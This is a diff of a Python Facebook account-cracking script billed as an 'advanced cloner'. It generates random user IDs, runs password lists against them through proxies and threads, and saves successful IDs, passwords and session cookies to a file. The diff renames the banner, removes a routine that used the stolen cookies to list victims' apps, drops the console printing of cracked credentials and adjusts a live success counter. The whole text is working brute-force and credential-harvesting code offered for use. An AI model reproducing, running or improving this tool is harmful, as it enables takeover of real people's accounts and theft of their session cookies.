@@ -18,35 +18,21 @@ warna = random.choice([P, M, H, K, B, U, O, N])
 def banner():
     os.system("clear")
     print(f"""{warna}
- /$$$$$$  /$$$$$$$  /$$   /$$  /$$$$$$  /$$$$$$$$ 
-| $$__  $$| $$__  $$| $$$ | $$ /$$__  $$| $$_____/ 
-| $$  \ $$| $$  \ $$| $$$$| $$| $$  \__/| $$       
-| $$$$$$$/| $$$$$$$/| $$ $$ $$| $$      | $$$$$    
-| $$__  $$| $$__  $$| $$  $$$| $$      | $$__/    
-| $$  \ $$| $$  \ $$| $$\  $$$| $$    $$| $$       
-| $$  | $$| $$  | $$| $$ \  $$|  $$$$$$/| $$$$$$$$ 
-|__/  |__/|__/  |__/|__/  \__/ \______/ |________/ 
----------------------------------------------------
+ /$$      /$$ /$$$$$$$        /$$$$$$$  /$$$$$$$  /$$$$$$ /$$   /$$  /$$$$$$  /$$$$$$$$ 
+| $$$    /$$$| $$__  $$      | $$__  $$| $$__  $$|_  $$_/| $$$ | $$ /$$__  $$| $$_____/ 
+| $$$$  /$$$$| $$  \ $$      | $$  \ $$| $$  \ $$  | $$  | $$$$| $$| $$  \__/| $$       
+| $$ $$/$$ $$| $$$$$$$/      | $$$$$$$/| $$$$$$$/  | $$  | $$ $$ $$| $$      | $$$$$    
+| $$  $$$| $$| $$__  $$      | $$____/ | $$__  $$  | $$  | $$  $$$| $$      | $$__/    
+| $$\  $ | $$| $$  \ $$      | $$      | $$  \ $$  | $$  | $$\  $$$| $$    $$| $$       
+| $$ \/  | $$| $$  | $$      | $$      | $$  | $$ /$$$$$$| $$ \  $$|  $$$$$$/| $$$$$$$$ 
+|__/     |__/|__/  |__/      |__/      |__/  |__/|______/|__/  \__/ \______/ |________/ 
+---------------------------------------------------------------------------------------
  AUTHOR    : MR-PRINCE  
+ FACEBOOK  : THE UNSTOPPABLE LEGEND MR PRINCE HERE
  TYPE      : ADVANCED CLONER  
- VERSION   : 2.5
----------------------------------------------------
+ VERSION   : 2.0
+---------------------------------------------------------------------------------------
     """)
-
-# Function to check Active & Expired Apps
-def cek_apk(session, coki):
-    try:
-        response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki}).text
-        soup = BeautifulSoup(response, "html.parser")
-        apps = [i.text for i in soup.find_all("h3")]
-        print(f"[✓] Active Apps: {', '.join(apps) if apps else 'No Active Apps'}")
-
-        response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki}).text
-        soup = BeautifulSoup(response, "html.parser")
-        expired_apps = [i.text for i in soup.find_all("h3")]
-        print(f"[✓] Expired Apps: {', '.join(expired_apps) if expired_apps else 'No Expired Apps'}")
-    except:
-        print("[!] Error checking apps.")
 
 # Proxy System
 def get_proxy():
@@ -73,7 +59,6 @@ def crack(uid, password_list, mode):
 
             if "c_user" in session.cookies.get_dict():
                 coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
-                print(f"\033[1;32m[PRINCE-OK] {uid} | {password} | {coki}\033[0m")
                 oks.append(uid)
                 
                 # Save successful logins
@@ -81,7 +66,6 @@ def crack(uid, password_list, mode):
                     f.write(f"{uid} | {password} | {coki}\n")
                 break
             elif "checkpoint" in session.cookies.get_dict():
-                print(f"\033[1;31m[CP] {uid} | {password}\033[0m")
                 cps.append(uid)
                 break
             elif mode == "slow":
@@ -106,13 +90,13 @@ def start_cloning():
         user.append(code + ''.join(random.choice(string.digits) for _ in range(7)))
 
     print(f"{H}[•] Starting Crack on {len(user)} IDs...")
-    
-    # Live count update system
+
+    # Live count update system (Attractive Single-Line Display)
     def live_count():
         while True:
-            sys.stdout.write(f"\r{H}[✓] OK: {len(oks)} | CP: {len(cps)}")
+            sys.stdout.write(f"\r{H}[✓] OK: {len(oks)} | {M}CP: {len(cps)} {N}")
             sys.stdout.flush()
-            time.sleep(5)
+            time.sleep(2)
 
     from threading import Thread
     Thread(target=live_count, daemon=True).start()
@@ -123,7 +107,7 @@ def start_cloning():
             executor.submit(crack, uid, passwords, mode)
 
     print(f"\n{H}[✓] Process Completed.")
-    print(f"{H}[✓] OK: {len(oks)} | CP: {len(cps)}")
+    print(f"{H}[✓] OK: {len(oks)} | {M}CP: {len(cps)}")
 
 if __name__ == "__main__":
     oks, cps = [], []
